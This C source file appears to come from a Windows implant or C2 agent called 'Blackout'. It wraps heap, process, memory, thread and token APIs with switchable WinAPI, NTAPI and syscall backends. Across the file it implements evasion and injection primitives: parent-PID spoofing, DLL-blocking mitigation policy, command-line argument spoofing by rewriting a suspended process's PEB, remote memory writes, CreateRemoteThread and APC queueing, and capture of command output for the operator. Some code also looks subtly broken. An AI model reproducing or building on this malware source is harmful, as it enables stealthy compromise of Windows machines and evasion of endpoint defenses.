#include <utils.h>
#include <common.h>
#include <evasion.h>

/*=================================[ Heap bkAPIs ]=================================*/

FUNC PVOID bkHeapAlloc(
    _In_ UINT64 Size
) {
    BLACKOUT_INSTANCE

    PVOID VmHeap = Instance()->Win32.RtlAllocateHeap( Blackout().Heap, 0, Size );

    return VmHeap;
}

FUNC PVOID bkHeapReAlloc(
    _In_ PVOID  Addr,
    _In_ UINT64 Size
) {
    BLACKOUT_INSTANCE

    PVOID VmHeap = Instance()->Win32.RtlReAllocateHeap( Blackout().Heap, 0, Addr, Size );

    return VmHeap;
}

FUNC BOOL bkHeapFree(
    _In_ PVOID  Data,
    _In_ UINT64 Size
) {
    BLACKOUT_INSTANCE

    MmZero( Data, Size );
    BOOL bSuc = Instance()->Win32.RtlFreeHeap( Blackout().Heap, 0, Data );
    Data = NULL;

    return bSuc;
}

/*=================================[ Process bkAPIs ]=================================*/

FUNC DWORD bkProcessOpen(
    _In_ DWORD DesiredAccess,
    _In_ BOOL  InheritHandle,
    _In_ DWORD ProcessId,
    _Out_ HANDLE *ProcessHandle
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
        *ProcessHandle = Instance()->Win32.OpenProcess( DesiredAccess, InheritHandle, ProcessId );
        Err = NtLastError();
    } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
        CLIENT_ID ClientId = { 0 };
        HANDLE hProcessTmp = NULL;
        OBJECT_ATTRIBUTES ProcAttr = RTL_CONSTANT_OBJECT_ATTRIBUTES( NULL, 0 );

        MmZero(&ClientId, sizeof(CLIENT_ID));
        ClientId.UniqueProcess = ProcessId;

        Err = Instance()->Win32.NtOpenProcess(&hProcessTmp, DesiredAccess, &ProcAttr, &ClientId);
        *ProcessHandle = hProcessTmp;
    }

    return Err;
}

FUNC DWORD bkProcessTerminate( 
    _In_ HANDLE hProcess,
    _In_ UINT32 ExitStatus
) {
    BLACKOUT_INSTANCE

    if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
        Instance()->Win32.TerminateProcess(hProcess, ExitStatus);
    } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
        Instance()->Win32.NtTerminateProcess(hProcess, ExitStatus);
    } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
        // SET_SYSCALL(Syscall().SysTable.NtTerminateProcess);
        // RunSyscall(hProcess, ExitStatus);   
    }

    return NtLastError();
}

FUNC DWORD bkProcessCreate(
    _In_      PSTR    ProcCmd,
    _In_      BOOL    InheritHandle,
    _In_      BOOL    Pipe,
    _In_opt_  DWORD   Flags,
    _Out_opt_ HANDLE *ProcessHandle,
    _Out_opt_ DWORD  *ProcessId,
    _Out_opt_ HANDLE *ThreadHandle,
    _Out_opt_ DWORD  *ThreadId
) {
    BLACKOUT_INSTANCE

    BOOL   bCheck = FALSE;
    UINT16 Count  = 0;

    PROCESS_INFORMATION          Pi             = { 0 };
    STARTUPINFOEXA               Si             = { 0 };
    PROCESS_BASIC_INFORMATION    Pbi            = { 0 };
    PPEB                         Peb            = bkHeapAlloc( sizeof( PEB ) );
    PRTL_USER_PROCESS_PARAMETERS Upp            = bkHeapAlloc( sizeof( RTL_USER_PROCESS_PARAMETERS ) );
    UINT32                       RetLen         = 0;
    UINT64                       BytesRead      = 0;
    UINT64                       AttrSize       = 0;
    PVOID                        AttrBuff       = NULL;
    UINT64                       Policy         = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    HANDLE                       hParentProcess = NULL;
    HANDLE                       hStdPipeRead   = NULL;
    HANDLE                       hStdPipeWrite  = NULL;
    BOOL                         bPipeRead      = TRUE;
    UCHAR                        Buffer[1025]   = { 0 };
    UINT32                       PipesBytesRead = 0;
    UINT32                       PipeBufferSize = 0;
    SECURITY_ATTRIBUTES          SecAttr        = { 0 };
    PVOID                        Output         = NULL;
    UINT32                       OutSize        = 0;

    MmZero( &Peb, sizeof( PEB ) );
    MmZero( &Pbi, sizeof( PROCESS_BASIC_INFORMATION ) );
    MmZero( &Pi,  sizeof( PROCESS_INFORMATION ) );
    MmZero( &Si,  sizeof( STARTUPINFOEXA ) );

    if ( Pipe ) {
        Output                       = Instance()->Win32.LocalAlloc( LPTR, 1025 );
        SecAttr.bInheritHandle       = TRUE;
        SecAttr.nLength              = sizeof( SECURITY_ATTRIBUTES );
        SecAttr.lpSecurityDescriptor = NULL;

        Instance()->Win32.CreatePipe( &hStdPipeRead, &hStdPipeWrite, &SecAttr, 0 );

        Si.StartupInfo.hStdError  = hStdPipeWrite;
        Si.StartupInfo.hStdOutput = hStdPipeWrite;
        Si.StartupInfo.dwFlags    = STARTF_USESTDHANDLES;
        InheritHandle = TRUE;
    }

    Si.StartupInfo.cb           = sizeof( STARTUPINFOEXA );
    Si.StartupInfo.wShowWindow  = SW_HIDE;
    Si.StartupInfo.dwFlags     += EXTENDED_STARTUPINFO_PRESENT;

    if ( Blackout().Fork.Argue     ) Count++;
    if ( Blackout().Fork.Blockdlls ) Count++;
    if ( Blackout().Fork.Ppid      ) Count++;

    if ( Count != 0 ) {
        Instance()->Win32.InitializeProcThreadAttributeList( NULL, Count, 0, &AttrSize );
        AttrBuff = bkHeapAlloc( AttrSize );
        Instance()->Win32.InitializeProcThreadAttributeList( AttrBuff, Count, 0, &AttrSize );
        Flags += EXTENDED_STARTUPINFO_PRESENT;
    }

    if ( Blackout().Fork.Blockdlls ) Instance()->Win32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( UINT64 ), NULL, 0 );
    if ( Blackout().Fork.Ppid      ) {
        bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, Blackout().Fork.Ppid, &hParentProcess );
        Instance()->Win32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof( HANDLE ), NULL, 0 );
    }
    if ( Blackout().Fork.Argue ) Flags += CREATE_SUSPENDED;
     
    if ( Blackout().Fork.Blockdlls || Blackout().Fork.Ppid || Blackout().Fork.Argue ) Si.lpAttributeList = AttrBuff;

    bCheck = Instance()->Win32.CreateProcessA( NULL, ProcCmd, NULL, NULL, InheritHandle, Flags, NULL, NULL, &Si.StartupInfo, &Pi );
    if ( !bCheck ) goto _Leave;

    *ProcessId     = Pi.dwProcessId;
    *ProcessHandle = Pi.hProcess;
    *ThreadId      = Pi.dwThreadId;
    *ThreadHandle  = Pi.hThread;

    if ( Blackout().Fork.Argue ) {
        Instance()->Win32.NtQueryInformationProcess( Pi.hProcess, ProcessBasicInformation, &Pbi, sizeof( PROCESS_BASIC_INFORMATION ), &RetLen );
        Instance()->Win32.ReadProcessMemory( Pi.hProcess, Pbi.PebBaseAddress, Peb, sizeof( PEB ), &BytesRead );
        Instance()->Win32.ReadProcessMemory( Pi.hProcess, Peb->ProcessParameters, Upp, sizeof( RTL_USER_PROCESS_PARAMETERS ) + 0xFF, &BytesRead );
        Instance()->Win32.WriteProcessMemory( Pi.hProcess, Upp->CommandLine.Buffer, Blackout().Fork.Argue, StringLengthW( Blackout().Fork.Argue ) * 2 + 1, &BytesRead );
        Instance()->Win32.NtResumeThread( Pi.hThread, 0 );
    }

    if ( Pipe ) {
        bkHandleClose( hStdPipeWrite );

        do {
            bPipeRead = Instance()->Win32.ReadFile( hStdPipeRead, Buffer, 1024, &PipesBytesRead, NULL );

            if ( !PipesBytesRead ) break;

            Output = Instance()->Win32.LocalReAlloc(
                Output, PipeBufferSize + PipesBytesRead,
                LMEM_MOVEABLE | LMEM_ZEROINIT
            );

            PipeBufferSize += PipesBytesRead;

            MmCopy( Output + ( PipeBufferSize - PipesBytesRead ), Buffer, PipesBytesRead );
            MmZero( Buffer, BytesRead );

        } while ( bPipeRead );

        OutSize = PipeBufferSize;
    }

_Leave:
    if ( AttrBuff      ) Instance()->Win32.DeleteProcThreadAttributeList( AttrBuff );
    if ( AttrBuff      ) bkHeapFree( AttrBuff, AttrSize );
    if ( Peb           ) bkHeapFree( Peb, sizeof( PEB ) );
    if ( Upp           ) bkHeapFree( Upp, sizeof( RTL_USER_PROCESS_PARAMETERS ) );
    if ( hStdPipeRead  ) bkHandleClose( hStdPipeRead );
    if ( hStdPipeWrite ) bkHandleClose( hStdPipeWrite );
    if ( Pipe ) {
        if ( Output ) {
            PackageAddBytes( BK_PACKAGE, Output, OutSize );
            MmZero( Output, OutSize );
            Instance()->Win32.LocalFree( Output );
        }
    } 
    
    return NtLastError();    
}

/*=================================[ Memory bkAPIs ]=================================*/

FUNC DWORD bkMemAlloc(
    _In_opt_    HANDLE  ProcessHandle,
    _Inout_opt_ PVOID  *BaseAddr,
    _In_        UINT64  RegionSize,
    _In_        DWORD   AllocationType,
    _In_        DWORD   Protection
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
        if ( ProcessHandle ) {
            *BaseAddr = Instance()->Win32.VirtualAllocEx(ProcessHandle, *BaseAddr, RegionSize, AllocationType, Protection);
        } else {
            *BaseAddr = Instance()->Win32.VirtualAlloc(NULL, RegionSize, AllocationType, Protection);
        }
        Err = NtLastError();
    } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
        PVOID MemAllocated = NULL;

        if ( !ProcessHandle )
            ProcessHandle = NtCurrentProcess();

        Err = Instance()->Win32.NtAllocateVirtualMemory(ProcessHandle, &MemAllocated, 0, &RegionSize, AllocationType, Protection);
        *BaseAddr = MemAllocated;
    } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
        PVOID MemAllocated = NULL;

        if ( !ProcessHandle )
            ProcessHandle = NtCurrentProcess();

        // SET_SYSCALL(Syscall().SysTable.NtAllocateVirtualMemory);
        // RunSyscall(ProcessHandle, &MemAllocated, 0, &RegionSize, AllocationType, Protection);
        *BaseAddr = MemAllocated;
    }

    return Err;
}

FUNC DWORD bkMemWrite(
    _In_ HANDLE ProcessHandle,
    _In_ PBYTE  MemBaseAddr,
    _In_ PBYTE  Buffer,
    _In_ DWORD  BufferSize
) {
    BLACKOUT_INSTANCE

    DWORD  Err = 0;
    UINT64 BytesWritten = 0;

    if (Blackout().bkApi == _BK_API_WINAPI_) {
        if (ProcessHandle) {
            Instance()->Win32.WriteProcessMemory( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
        } else {
            MmCopy( MemBaseAddr, Buffer, BufferSize );
        }
        Err = NtLastError();
    } else if (Blackout().bkApi == _BK_API_NTAPI_) {
        if (!ProcessHandle)    
            ProcessHandle = NtCurrentProcess();

        Err = Instance()->Win32.NtWriteVirtualMemory( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
    } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
        if (!ProcessHandle)    
            ProcessHandle = NtCurrentProcess();

        // SET_SYSCALL(Syscall().SysTable.NtWriteVirtualMemory);
        // RunSyscall(ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten);
    }

    return Err;
}

FUNC DWORD bkMemProtect(
    _In_  HANDLE ProcessHandle,
    _In_  PVOID  BaseAddr,
    _In_  UINT64 RegionSize,
    _In_  DWORD  NewProtection
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;
    DWORD OldProtection = 0;

    if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
        if ( ProcessHandle ) {
            Instance()->Win32.VirtualProtectEx( ProcessHandle, BaseAddr, RegionSize, NewProtection, &OldProtection );
        } else {
            Instance()->Win32.VirtualProtect( BaseAddr, RegionSize, NewProtection, &OldProtection );
        }
        Err = NtLastError();
    } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
        if ( !ProcessHandle )    
            ProcessHandle = NtCurrentProcess();
        
        Err = Instance()->Win32.NtProtectVirtualMemory( ProcessHandle, &BaseAddr, &RegionSize, NewProtection, &OldProtection );
    } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
        if ( !ProcessHandle )    
            ProcessHandle = NtCurrentProcess();
        
        // SET_SYSCALL(Syscall().SysTable.NtProtectVirtualMemory);
        // RunSyscall(ProcessHandle, &BaseAddr, &RegionSize, NewProtection, &OldProtection);
    }
    
    return Err;
}

FUNC DWORD bkMemQuery(
    _In_opt_ HANDLE  ProcessHandle,
    _In_     PVOID   BaseAddress,
    _Out_    PVOID  *AllocationBase,
    _Out_    DWORD  *AllocationProtect,
    _Out_    PVOID  *BaseAddressRt,
    _Out_    DWORD  *Protect,
    _Out_    DWORD  *RegionSize,
    _Out_    DWORD  *State,
    _Out_    DWORD  *Type
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    MEMORY_BASIC_INFORMATION Mbi = { 0 };
    MmZero( &Mbi, sizeof(MEMORY_BASIC_INFORMATION) );

    if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
        if (ProcessHandle) {
            Instance()->Win32.VirtualQueryEx( ProcessHandle, BaseAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION) );
        } else {
            Instance()->Win32.VirtualQuery( BaseAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION) );
        }
        Err = NtLastError();
    } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
        if ( !ProcessHandle )
            ProcessHandle = NtCurrentProcess();

        Err = Instance()->Win32.NtQueryVirtualMemory(
            ProcessHandle, BaseAddress,
            MemoryBasicInformation, &Mbi,
            sizeof(MEMORY_BASIC_INFORMATION), NULL
        );
    } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
        if ( !ProcessHandle )
            ProcessHandle = NtCurrentProcess();

        // SET_SYSCALL(Syscall().SysTable.NtQueryVirtualMemory);
        // RunSyscall(
        //     ProcessHandle, BaseAddress,
        //     MemoryBasicInformation, &Mbi,
        //     sizeof(MEMORY_BASIC_INFORMATION), NULL
        // );
    }

    *AllocationBase    = Mbi.AllocationBase;
    *AllocationProtect = Mbi.AllocationProtect;
    *BaseAddressRt     = Mbi.BaseAddress;
    *Protect           = Mbi.Protect;
    *RegionSize        = Mbi.RegionSize;
    *State             = Mbi.State;
    *Type              = Mbi.Type;

    return Err;
}

FUNC DWORD bkMemFree(
    _In_opt_ HANDLE ProcessHandle,
    _In_     PVOID  MemAddress,
    _In_     UINT64 SizeToFree
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    if ( Blackout().bkApi == _BK_API_WINAPI_ ) {

        if ( ProcessHandle ) {
            Instance()->Win32.VirtualFreeEx( ProcessHandle, MemAddress, SizeToFree, MEM_RELEASE );
        } else {
            Instance()->Win32.VirtualFree( MemAddress, SizeToFree, MEM_RELEASE );
        }
        Err = NtLastError();

    } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
        Err = Instance()->Win32.NtFreeVirtualMemory( ProcessHandle, &MemAddress, SizeToFree, MEM_RELEASE );
    }

    return Err;
}


/*=================================[ Thread bkAPIs ]=================================*/

FUNC DWORD bkThreadCreate( 
    _In_     HANDLE  ProcessHandle,
    _In_     PVOID   BaseAddr,
    _In_opt_ PVOID   Parameter,
    _In_     DWORD   Flags,
    _In_     DWORD   StackSize,
    _In_opt_ PDWORD  ThreadId,
    _In_opt_ PHANDLE ThreadHandle
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
        DWORD ThreadIdTmp = 0;
        if ( ProcessHandle ) {
            ThreadHandle = Instance()->Win32.CreateRemoteThread( ProcessHandle, NULL, StackSize, BaseAddr, Parameter, Flags, &ThreadIdTmp );
            *ThreadId = ThreadIdTmp;
        } else {
            ThreadHandle = Instance()->Win32.CreateThread( NULL, StackSize, BaseAddr, Parameter, Flags, &ThreadIdTmp );
            *ThreadId = ThreadIdTmp;
        }

        Err = NtLastError();
    } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
        Err = Instance()->Win32.NtCreateThreadEx( &ThreadHandle, THREAD_ALL_ACCESS, NULL, ProcessHandle, BaseAddr, Parameter, Flags, 0, StackSize, 0, NULL );
        *ThreadId = Instance()->Win32.GetThreadId( ThreadHandle );
    }
    
    return Err;
}

FUNC DWORD bkThreadTerminate(
    _In_ HANDLE ThreadHandle,
    _In_ DWORD  ExitCode
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    if ( Blackout().bkApi == _BK_API_WINAPI_ ) {

        Instance()->Win32.TerminateThread(ThreadHandle, ExitCode);
        Err = NtLastError();
        
    } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {

        Err = Instance()->Win32.NtTerminateThread(ThreadHandle, ExitCode);

    }

    return Err;
}

FUNC DWORD bkThreadSuspend(
    _In_ HANDLE ThreadHandle
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    if (Blackout().bkApi == _BK_API_WINAPI_ ) {
        Instance()->Win32.SuspendThread(ThreadHandle);
        Err = NtLastError();
    } else if (Blackout().bkApi == _BK_API_NTAPI_ ) {
        Err = Instance()->Win32.NtSuspendThread(ThreadHandle, NULL);
    }

    return Err;
}


FUNC DWORD bkThreadResume(
    _In_ HANDLE ThreadHandle
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    if (Blackout().bkApi == _BK_API_WINAPI_ ) {
        Instance()->Win32.ResumeThread(ThreadHandle);
        Err = NtLastError();
    } else if (Blackout().bkApi == _BK_API_NTAPI_ ) {
        Err = Instance()->Win32.NtResumeThread(ThreadHandle, NULL);
    }

    return Err;
}


FUNC DWORD bkThreadApcQueue(
    HANDLE ThreadHandle,
    PVOID  BaseAddress,
    UINT64 Parameter
) { 
    BLACKOUT_INSTANCE

    UINT32 bkErrorCode = 0;

    if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
        
        bkErrorCode = Instance()->Win32.QueueUserAPC( BaseAddress, ThreadHandle, Parameter );
        if ( bkErrorCode != 0 ) return NtLastError();

    } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {

        bkErrorCode = Instance()->Win32.NtQueueApcThread( ThreadHandle, BaseAddress, Parameter, NULL, NULL );
        return bkErrorCode;

    } else {
        return;
    }
}

/*=================================[ Token bkAPIs ]=================================*/

FUNC DWORD bkTokenOpen(
    _In_ HANDLE  TargetHandle,
    _In_ DWORD   AccessRights,
    _In_ PHANDLE TokenHandle,
    _In_ UINT16  ObjectType
) {
    BLACKOUT_INSTANCE

    DWORD Err = 0;

    if ( ObjectType == 0x01 ) {
        if ( Blackout().bkApi == _BK_API_WINAPI_ ) {

            Instance()->Win32.OpenProcessToken( TargetHandle, AccessRights, TokenHandle );
            Err = NtLastError();

        } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {

            Err = Instance()->Win32.NtOpenProcessToken( TargetHandle, AccessRights, TokenHandle );

        }
    } else if ( ObjectType == 0x02 ) {
        if ( Blackout().bkApi == _BK_API_WINAPI_ ) {

            Instance()->Win32.OpenThreadToken( TargetHandle, AccessRights, FALSE, TokenHandle );
            Err = NtLastError();

        } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {

            Err = Instance()->Win32.NtOpenThreadToken( TargetHandle, AccessRights, FALSE, TokenHandle );

        }

    } else {
        Err = ERROR_INVALID_PARAMETER;
    }

    return Err;
}


/*=================================[ Miscellaneous bkAPIs ]=================================*/

FUNC BOOL bkHandleClose(
    _In_ HANDLE hObject
) {
    BLACKOUT_INSTANCE

    BOOL bCheck = FALSE;

    if (hObject) {
        if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
            bCheck = Instance()->Win32.CloseHandle(hObject);
        } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
            bCheck = (Instance()->Win32.NtClose(hObject) == STATUS_SUCCESS);
        }
    }

    return bCheck;
}

FUNC DWORD bkFileCreate( 
    _In_ PSTR FileName,
    _In_ DWORD AccessRights
) {
    BLACKOUT_INSTANCE

    //Instance()->Win32.CreateFileA( FileName, AccessRights. )

} 

FUNC DWORD bkPipeCreate(
    _Out_ PHANDLE hStdPipeRead,
    _Out_ PHANDLE hStdPipeWrite
) {
    BLACKOUT_INSTANCE

    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
    Instance()->Win32.CreatePipe( &hStdPipeRead, &hStdPipeWrite, &SecurityAttr, 0 );

    return NtLastError();
}